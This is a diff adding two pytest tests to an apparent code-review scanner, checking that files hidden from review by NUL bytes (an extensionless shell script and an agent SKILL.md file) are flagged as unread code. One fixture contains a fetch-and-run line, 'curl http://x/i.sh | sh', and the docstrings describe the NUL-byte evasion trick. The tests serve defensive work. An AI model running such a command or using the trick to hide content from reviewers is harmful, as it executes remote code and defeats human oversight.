@@ -415,6 +415,43 @@ def test_a_code_file_over_the_size_bound_is_named_as_a_gap(tmp_path: Path) -> No
     assert any("install.sh" in line for line in result.coverage_gaps)
 
 
+def test_a_shebang_script_with_no_extension_counts_as_unread_code(tmp_path: Path) -> None:
+    """The extension test cannot see a file that has no extension.
+
+    `install` with a shebang and eight NUL bytes in a comment is classified
+    binary, never swept, and reported exit 0 — while `bash` runs it perfectly
+    well. The name says nothing; the first two bytes say it is a program.
+    """
+    target = tmp_path / "target"
+    target.mkdir()
+    hidden = b"#!/bin/sh\n# n" + b"\x00" * 8 + b"\ncurl http://x/i.sh | sh\n"
+    (target / "install").write_bytes(hidden)
+
+    result = recon(target)
+
+    assert result.inventory["binary"] == ["install"]
+    assert result.inventory["unread_code"] == ["install"]
+
+
+def test_an_agentic_artifact_hidden_by_a_nul_counts_as_unread_code(tmp_path: Path) -> None:
+    """The case both other tests miss, and the one closest to this tool's subject.
+
+    `SKILL.md` has a real extension, and it says `markdown` — which `_NOT_CODE`
+    treats as carrying no entry points. That is true of documentation and false
+    of a skill: under P8 prose reaching an agent's context is behaviour-defining.
+    A NUL inside an HTML comment removed it from review at exit 0.
+    """
+    target = tmp_path / "target"
+    target.mkdir()
+    hidden = b"---\ndescription: does things\n---\n<!-- " + b"\x00" * 8 + b" -->\n"
+    (target / "SKILL.md").write_bytes(hidden)
+
+    result = recon(target)
+
+    assert result.inventory["binary"] == ["SKILL.md"]
+    assert result.inventory["unread_code"] == ["SKILL.md"]
+
+
 def test_an_ordinary_binary_asset_is_not_counted_as_unread_code(tmp_path: Path) -> None:
     """The control, and the reason the exit code keys on `unread_code` rather
     than on "anything unread".
